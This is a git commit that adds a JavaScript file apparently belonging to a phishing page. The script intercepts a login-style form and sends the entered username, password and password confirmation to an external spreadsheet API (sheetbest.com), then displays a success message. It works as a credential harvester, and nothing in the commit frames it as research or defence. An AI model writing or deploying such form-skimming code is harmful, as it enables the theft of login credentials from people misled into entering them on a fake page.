f7d29bc9b0724aa74e7b1ee18dc91853ddd55bf8
mx-port <cyclemoor4@gmail.com>
2024-11-14 19:03:19 -0600

    add files

---
+++ santa/js/1820sa.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/a90d9b83-a852-47e2-b65e-9936a79304c7', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "1": formulario.usuario.value,
+            "2": formulario.contraseña.value,
+            "3": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
